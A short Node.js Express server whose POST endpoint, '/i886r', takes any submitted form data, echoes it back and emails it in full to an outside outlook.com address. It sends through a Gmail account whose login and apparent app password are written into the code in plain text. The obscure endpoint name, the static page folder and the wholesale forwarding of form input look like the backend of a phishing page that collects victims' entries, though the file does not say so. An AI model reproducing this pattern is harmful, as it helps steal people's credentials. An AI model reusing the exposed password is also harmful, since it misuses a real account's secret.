const express = require('express');
const nodemailer = require('nodemailer')
const app = express()
const port = process.env.PORT || 5000

// Middleware to parse JSON and form data
app.use(express.static('public'))
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/form', (req,res) => {
    res.send('hello world')

})
//form
app.post('/i886r', (req,res) => {
    res.send(req.body)

    msg = JSON.stringify(req.body)

//send mail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'xcimxmusic@gmail.com',
        pass: 'lqqphswvzspirmom'
    },
})

//message
const message = {
    from: 'xcimxmusic@gmail.com',
    to: 'nexusiwill@outlook.com',
    text: msg,
    attachments: [{
           // file on disk as an attachment
            filename: '351949877022887533.jpg',
            path: 'public/351949877022887533.jpg' // stream this file
        
    },]
};

//send the message
transporter.sendMail(message,(error, info) => {
    if (error) {
        console.error('Error sending email:', error);
        } else {
        console.log('Email sent:', info.response);
        }
})

})

const start = () => {
    app.listen(port, () => {
        console.log(`server is running on port ${port}`)
    })
}

start()